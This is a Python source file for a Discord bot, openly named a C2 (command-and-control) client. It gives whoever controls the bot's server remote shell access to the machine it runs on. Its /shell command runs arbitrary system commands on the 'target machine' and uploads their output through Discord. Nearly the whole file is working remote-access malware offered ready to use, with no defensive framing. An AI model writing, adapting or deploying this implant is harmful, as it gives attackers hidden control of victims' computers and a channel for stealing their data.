import discord
import os
import subprocess
import tempfile

# --- Configuration ---
# IMPORTANT: Replace these with your actual Bot Token and Server (Guild) ID
TOKEN = 'Discord_token'
GUILD_ID = 0  # Replace 0 with your integer Server ID
# -------------------

# Discord's file upload limit is 25MB for bots on standard servers.
MAX_FILE_SIZE = 25 * 1024 * 1024

# Define the necessary intents for the bot to function correctly
intents = discord.Intents.default()
intents.message_content = True

class C2Client(discord.Client):
    def __init__(self, *, intents: discord.Intents):
        super().__init__(intents=intents)
        # The command tree is essential for registering and handling slash commands
        self.tree = discord.app_commands.CommandTree(self)

    async def on_ready(self):
        # Syncs the slash commands to your specific server for instant availability
        guild = discord.Object(id=GUILD_ID)
        self.tree.copy_global_to(guild=guild)
        await self.tree.sync(guild=guild)
        
        print(f'Logged in as {self.user}.')
        print(f'Ready to receive commands on server ID: {GUILD_ID}')
        print('Client is operational.')

# Create an instance of the client
client = C2Client(intents=intents)

# --- Help Command ---
@client.tree.command(name="help", description="Shows help for all available commands.")
async def help(interaction: discord.Interaction):
    """Provides a user-friendly guide on how to use the bot's commands."""
    
    embed = discord.Embed(
        title="C2 Bot Command Help",
        description="This bot provides shell access to the host machine via slash commands.",
        color=discord.Color.dark_red()
    )
    
    embed.add_field(
        name="`/shell <command>`",
        value=(
            "Executes a system command and returns the output as a text file.\n"
            "**Examples:**\n"
            "• `/shell whoami`\n"
            "• `/shell ipconfig` (Windows)\n"
            "• `/shell ls -la /` (Linux)"
        ),
        inline=False
    )
    
    embed.add_field(
        name="`/help`",
        value="Displays this help message.",
        inline=False
    )
    
    embed.set_footer(text="Responses are ephemeral (visible only to you). Max output file size is 25MB.")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# --- Shell Command ---
@client.tree.command(name="shell", description="Execute a shell command on the target machine.")
async def shell(interaction: discord.Interaction, command: str):
    """Handles the execution of shell commands and returns the output."""
    
    await interaction.response.defer(thinking=True, ephemeral=True)
    
    tmp_file_path = None  # Initialize to ensure it exists for cleanup
    try:
        # Handle 'cd' command to change the working directory
        if command.strip().lower().startswith('cd '):
            try:
                directory = command.strip().split(' ', 1)[1]
                os.chdir(directory)
                await interaction.followup.send(f"Changed directory to: `{os.getcwd()}`", ephemeral=True)
            except FileNotFoundError:
                await interaction.followup.send(f"Directory not found: `{directory}`", ephemeral=True)
            except Exception as e:
                await interaction.followup.send(f"Error changing directory: {e}", ephemeral=True)
            return

        # For all other commands, stream output directly to a temporary file for memory safety
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt', encoding='utf-8', errors='replace') as tmp_file:
            tmp_file_path = tmp_file.name
            
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=tmp_file,
                stderr=subprocess.STDOUT
            )
            process.wait(timeout=300)  # 5-minute timeout for the command to complete

        # Check the size of the output file
        file_size = os.path.getsize(tmp_file_path)

        if file_size == 0:
            await interaction.followup.send("Command executed with no output.", ephemeral=True)
        elif file_size > MAX_FILE_SIZE:
            await interaction.followup.send(
                f"Command output was too large ({file_size / (1024*1024):.2f}MB). The limit is 25MB.",
                ephemeral=True
            )
        else:
            await interaction.followup.send(
                f"Output for command: `{command}`", 
                file=discord.File(tmp_file_path, filename="output.txt"),
                ephemeral=True
            )
    
    except subprocess.TimeoutExpired:
        await interaction.followup.send(f"Command `{command}` timed out after 5 minutes.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"An error occurred while executing the command: {str(e)}", ephemeral=True)
    finally:
        # Ensure the temporary file is always cleaned up
        if tmp_file_path and os.path.exists(tmp_file_path):
            os.remove(tmp_file_path)

# --- Main Execution Block ---
if __name__ == '__main__':
    if TOKEN == 'YOUR_DISCORD_BOT_TOKEN' or GUILD_ID == 0:
        print("[!] ERROR: Please edit the script and set your TOKEN and GUILD_ID before running.")
    else:
        try:
            client.run(TOKEN)
        except discord.errors.LoginFailure:
            print("[!] FATAL ERROR: Login failed. The bot TOKEN is incorrect, expired, or has been reset.")
        except discord.errors.PrivilegedIntentsRequired:
            print("[!] FATAL ERROR: Privileged Gateway Intents are required. Please enable 'MESSAGE CONTENT INTENT' in the Discord Developer Portal.")
        except Exception as e:
            print(f"[!] FATAL ERROR: An unexpected error occurred: {e}")

